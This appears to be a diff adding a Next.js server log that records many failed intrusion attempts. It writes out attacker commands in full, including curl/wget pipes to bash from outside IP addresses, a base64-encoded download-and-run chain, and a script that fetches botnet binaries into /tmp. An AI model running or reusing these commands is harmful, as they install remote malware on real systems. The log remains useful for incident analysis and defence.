@@ -1,0 +1,496 @@
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+/bin/sh: ipconfig: not found
+ ⨯ [Error: Command failed: ipconfig
+/bin/sh: ipconfig: not found
+] {
+  status: 127,
+  signal: null,
+  output: [Array],
+  pid: 10259,
+  stdout: <Buffer >,
+  stderr: <Buffer 2f 62 69 6e 2f 73 68 3a 20 69 70 63 6f 6e 66 69 67 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a>,
+  digest: '663816728'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+[ReferenceError: res is not defined]
+ ⨯ uncaughtException:  [ReferenceError: res is not defined]
+/bin/sh: bash: not found
+ ⨯ [Error: Command failed: wget -qO- http://217.60.249.228:8000/stx.sh | bash
+/bin/sh: bash: not found
+] {
+  status: 127,
+  signal: null,
+  output: [Array],
+  pid: 10725,
+  stdout: <Buffer >,
+  stderr: <Buffer 2f 62 69 6e 2f 73 68 3a 20 62 61 73 68 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a>,
+  digest: '1119891423'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: you need to specify whom to kill
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+/bin/sh: bash: not found
+ ⨯ [Error: Command failed: wget -qO- http://217.60.249.228:8000/stx.sh | bash
+/bin/sh: bash: not found
+] {
+  status: 127,
+  signal: null,
+  output: [Array],
+  pid: 14788,
+  stdout: <Buffer >,
+  stderr: <Buffer 2f 62 69 6e 2f 73 68 3a 20 62 61 73 68 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a>,
+  digest: '1119891423'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+/bin/sh: bash: not found
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0   168    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+curl: (23) Failure writing output to destination, passed 168 returned 0
+ ⨯ [Error: Command failed: curl http://45.134.174.235:443/2.sh | bash
+/bin/sh: bash: not found
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0   168    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+curl: (23) Failure writing output to destination, passed 168 returned 0
+] {
+  status: 127,
+  signal: null,
+  output: [Array],
+  pid: 15835,
+  stdout: <Buffer >,
+  stderr: <Buffer 2f 62 69 6e 2f 73 68 3a 20 62 61 73 68 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a 20 20 25 20 54 6f 74 61 6c 20 20 20 20 25 20 52 65 63 65 69 76 65 64 20 25 ... 364 more bytes>,
+  digest: '33545823'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+ ⨯ [TypeError: Cannot read properties of undefined (reading 'aa')] {
+  digest: '2225339846'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+rm: can't remove 'colonna.arc': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arc: No such file or directory
+./bins.sh: line 9: ./colonna.arc: not found
+rm: can't remove 'colonna.arm': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arm: No such file or directory
+./bins.sh: line 9: ./colonna.arm: not found
+rm: can't remove 'colonna.arm5': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arm5: No such file or directory
+./bins.sh: line 9: ./colonna.arm5: not found
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+ ⨯ Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006
+rm: can't remove 'colonna.arc': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arc: No such file or directory
+./bins.sh: line 9: ./colonna.arc: not found
+rm: can't remove 'colonna.arm': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arm: No such file or directory
+./bins.sh: line 9: ./colonna.arm: not found
+rm: can't remove 'colonna.arm5': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arm5: No such file or directory
+./bins.sh: line 9: ./colonna.arm5: not found
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+    at <unknown> (Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006) {
+        status: 1,
+  signal: null,
+  output: [Array],
+  pid: 18715,
+  stdout: <Buffer 45 78 65 63 20 66 6f 72 6d 61 74 20 65 72 72 6f 72 00 0a>,
+  stderr: <Buffer 72 6d 3a 20 63 61 6e 27 74 20 72 65 6d 6f 76 65 20 27 63 6f 6c 6f 6e 6e 61 2e 61 72 63 27 3a 20 4e 6f 20 73 75 63 68 20 66 69 6c 65 20 6f 72 20 64 69 ... 981 more bytes>,
+  digest: '848121944'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+[Error: spawn calc.exe ENOENT] {
+        errno: -2,
+  code: 'ENOENT',
+  syscall: 'spawn calc.exe',
+  path: 'calc.exe',
+  spawnargs: []
+}
+ ⨯ uncaughtException:  [Error: spawn calc.exe ENOENT] {
+        errno: -2,
+  code: 'ENOENT',
+  syscall: 'spawn calc.exe',
+  path: 'calc.exe',
+  spawnargs: []
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100 8498k  100 8498k    0     0  15.1M      0 --:--:-- --:--:-- --:--:-- 15.3M
+/bin/sh: /tmp/a.out: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '1864379169' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+/bin/sh: bash: not found
+ ⨯ [Error: Command failed: echo KGNvbW1hbmQgLXYgY3VybCA+L2Rldi9udWxsIDI+JjEgJiYgY3VybCAtcyBodHRwOi8vNDcuODkuMTQ5LjUzL2luZGV4IHwgYmFzaCkgfHwgKGNvbW1hbmQgLXYgd2dldCA+L2Rldi9udWxsIDI+JjEgJiYgd2dldCAtcSAtTy0gaHR0cDovLzQ3Ljg5LjE0OS41My9pbmRleCB8IGJhc2gpIHx8IChjb21tYW5kIC12IHB5dGhvbjMgPi9kZXYvbnVsbCAyPiYxICYmIHB5dGhvbjMgLWMgImltcG9ydCB1cmxsaWIucmVxdWVzdCBhcyB1LHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MuUG9wZW4oWydiYXNoJ10sIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkuY29tbXVuaWNhdGUodS51cmxvcGVuKCdodHRwOi8vNDcuODkuMTQ5LjUzL2luZGV4JykucmVhZCgpKSIpIHx8IChjb21tYW5kIC12IHB5dGhvbiA+L2Rldi9udWxsIDI+JjEgJiYgcHl0aG9uIC1jICJpbXBvcnQgdXJsbGliMiBhcyB1LHN1YnByb2Nlc3M7IHN1YnByb2Nlc3MuUG9wZW4oWydiYXNoJ10sIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkuY29tbXVuaWNhdGUodS51cmxvcGVuKCdodHRwOi8vNDcuODkuMTQ5LjUzL2luZGV4JykucmVhZCgpKSIp | base64 -d | bash
+/bin/sh: bash: not found
+] {
+  status: 127,
+  signal: null,
+  output: [Array],
+  pid: 23694,
+  stdout: <Buffer >,
+  stderr: <Buffer 2f 62 69 6e 2f 73 68 3a 20 62 61 73 68 3a 20 6e 6f 74 20 66 6f 75 6e 64 0a>,
+  digest: '312158744'
+}
+rm: can't remove 'colonna.arc': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arc: No such file or directory
+./bins.sh: line 9: ./colonna.arc: not found
+rm: can't remove 'colonna.arm': No such file or directory
+./colonna.arm: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm5': No such file or directory
+./colonna.arm5: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+ ⨯ Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006
+rm: can't remove 'colonna.arc': No such file or directory
+wget: error getting response: Connection reset by peer
+chmod: colonna.arc: No such file or directory
+./bins.sh: line 9: ./colonna.arc: not found
+rm: can't remove 'colonna.arm': No such file or directory
+./colonna.arm: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm5': No such file or directory
+./colonna.arm5: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+    at <unknown> (Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006) {
+        status: 1,
+  signal: null,
+  output: [Array],
+  pid: 23714,
+  stdout: <Buffer 45 78 65 63 20 66 6f 72 6d 61 74 20 65 72 72 6f 72 00 0a>,
+  stderr: <Buffer 72 6d 3a 20 63 61 6e 27 74 20 72 65 6d 6f 76 65 20 27 63 6f 6c 6f 6e 6e 61 2e 61 72 63 27 3a 20 4e 6f 20 73 75 63 68 20 66 69 6c 65 20 6f 72 20 64 69 ... 828 more bytes>,
+  digest: '903574200'
+}
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+Connecting to 193.34.213.150 (193.34.213.150:80)
+wget: can't open 'x86': Permission denied
+chmod: x86: No such file or directory
+/bin/sh: ./x86: not found
+sh: can't create /dev/health.sh: Permission denied
+chmod: /dev/health.sh: No such file or directory
+sh: /dev/health.sh: not found
+ ⨯ [Error: NEXT_REDIRECT] { digest: '12334\nMEOWWWWWWWWW' }
+   ▲ Next.js 15.5.4
+   - Local:        http://localhost:3000
+   - Network:      http://172.25.0.7:3000
+ ✓ Starting...
+ ✓ Ready in 1914ms
+rm: can't remove 'colonna.arc': No such file or directory
+./colonna.arc: line 1: syntax error: unexpected "("
+rm: can't remove 'colonna.arm': No such file or directory
+./colonna.arm: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm5': No such file or directory
+./colonna.arm5: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+ ⨯ Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006
+rm: can't remove 'colonna.arc': No such file or directory
+./colonna.arc: line 1: syntax error: unexpected "("
+rm: can't remove 'colonna.arm': No such file or directory
+./colonna.arm: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm5': No such file or directory
+./colonna.arm5: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm6': No such file or directory
+./colonna.arm6: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.arm7': No such file or directory
+./colonna.arm7: line 1: syntax error: unexpected word (expecting ")")
+rm: can't remove 'colonna.i486': No such file or directory
+rm: can't remove 'a.sh': No such file or directory
+rm: can't remove '*.sh': No such file or directory
+    at <unknown> (Error: Command failed: cd /tmp; wget -q http://194.69.203.32:81/hiddenbink/react.sh -O bins.sh; chmod 777 bins.sh; ./bins.sh 168.197.141.130:3006) {
+        status: 1,
+  signal: null,
+  output: [Array],
+  pid: 48,
+  stdout: <Buffer 45 78 65 63 20 66 6f 72 6d 61 74 20 65 72 72 6f 72 00 0a>,
+  stderr: <Buffer 72 6d 3a 20 63 61 6e 27 74 20 72 65 6d 6f 76 65 20 27 63 6f 6c 6f 6e 6e 61 2e 61 72 63 27 3a 20 4e 6f 20 73 75 63 68 20 66 69 6c 65 20 6f 72 20 64 69 ... 735 more bytes>,
+  digest: '241379576'
+}
